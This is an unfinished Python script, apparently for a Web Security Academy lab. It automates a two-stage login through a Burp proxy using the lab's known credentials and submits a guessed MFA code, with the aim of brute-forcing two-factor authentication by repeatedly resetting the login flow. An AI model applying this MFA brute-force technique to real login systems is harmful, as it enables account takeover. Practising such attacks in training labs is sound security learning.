import os

'''
Performs a two different requests, based on response html parameters

General outline:
 * perform 1st login stage
 * perform second login stage, observing html response element
 * depending on html response element, either go back to 1st login, or continue with 2nd stage
 ? will the code be reset after two attempts?...hmmmm...guess i'll find out

'''

'''
 1) get login; grab csrf
 2) post login, with uid,pw,csrf
 3) get login2; grab csrf
 4) post login2, with code & csrf

'''

'''
objservations:
 # every get to login creates a new session & csrf
'''


# setup the variables for requests to go through burp
# https://www.th3r3p0.com/random/python-requests-and-burp-suite.html
os.environ['REQUESTS_CA_BUNDLE'] = 'burp_cert.pem'
os.environ['HTTP_PROXY'] = "http://127.0.0.1:8080"
os.environ['HTTPS_PROXY'] = "http://127.0.0.1:8080"


def get_login_1() -> tuple:
  import requests

  burp0_url = "https://acae1f731fff214d804260a000680025.web-security-academy.net:443/login"
  burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://acae1f731fff214d804260a000680025.web-security-academy.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}

  from requests_html import HTMLSession
  session = HTMLSession()

  get_login_response = session.get(burp0_url, headers=burp0_headers)
  response_session_cookie = get_login_response.cookies.get('session')

  response_html = get_login_response.html

  csrf_element = response_html.find("[name=csrf]", first=True)
  csrf_attribute_value = csrf_element.attrs.get('value')
  print(csrf_attribute_value)

  return csrf_attribute_value, response_session_cookie


def post_login_1(csrf_token, session) -> str:
  import requests

  burp0_url = "https://acae1f731fff214d804260a000680025.web-security-academy.net:443/login"
  burp0_cookies = {"session": session}
  burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "https://acae1f731fff214d804260a000680025.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded",
                   "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://acae1f731fff214d804260a000680025.web-security-academy.net/login", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
  burp0_data = {"csrf": csrf_token,
                "username": "carlos", "password": "montoya"}
  post_login_response = requests.post(
      burp0_url, allow_redirects=False, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
  return post_login_response.cookies.get('session')


def get_login_2(session) -> tuple:
  import requests

  burp0_url = "https://acae1f731fff214d804260a000680025.web-security-academy.net:443/login2"
  burp0_cookies = {"session": session}
  burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36", "Accept-Encoding": "gzip, deflate", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Connection": "close", "Cache-Control": "max-age=0",
                   "Upgrade-Insecure-Requests": "1", "Origin": "https://acae1f731fff214d804260a000680025.web-security-academy.net", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://acae1f731fff214d804260a000680025.web-security-academy.net/login", "Accept-Language": "en-US,en;q=0.9"}

  from requests_html import HTMLSession
  session = HTMLSession()

  get_login_response = session.get(
      burp0_url, headers=burp0_headers, cookies=burp0_cookies)
  response_session_cookie = get_login_response.cookies.get('session')

  response_html = get_login_response.html

  csrf_element = response_html.find("[name=csrf]", first=True)
  csrf_attribute_value = csrf_element.attrs.get('value')
  print(csrf_attribute_value)

  return csrf_attribute_value, response_session_cookie


def post_login_2(csrf_token, session, mfa_code) -> str:
  import requests

  burp0_url = "https://acae1f731fff214d804260a000680025.web-security-academy.net:443/login2"
  burp0_cookies = {"session": session}
  burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "https://acae1f731fff214d804260a000680025.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded",
                   "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://acae1f731fff214d804260a000680025.web-security-academy.net/login2", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
  burp0_data = {"csrf": csrf_token, "mfa-code": mfa_code}

  post_login_response = requests.post(
      burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
  return post_login_response.cookies.get('session')


def main():
  # outer loop
  csrf_value, session = get_login_1()
  session = post_login_1(csrf_token=csrf_value, session=session)
  # inner loop
  csrf_value, new_session = get_login_2(session=session)
  if new_session:
    session = new_session
    # fix-me - some logic here about going back to stage 1...
  session = post_login_2(csrf_token=csrf_value, session=session, mfa_code="1111")

  # aside - maybe if i never hit the second attempt...

main()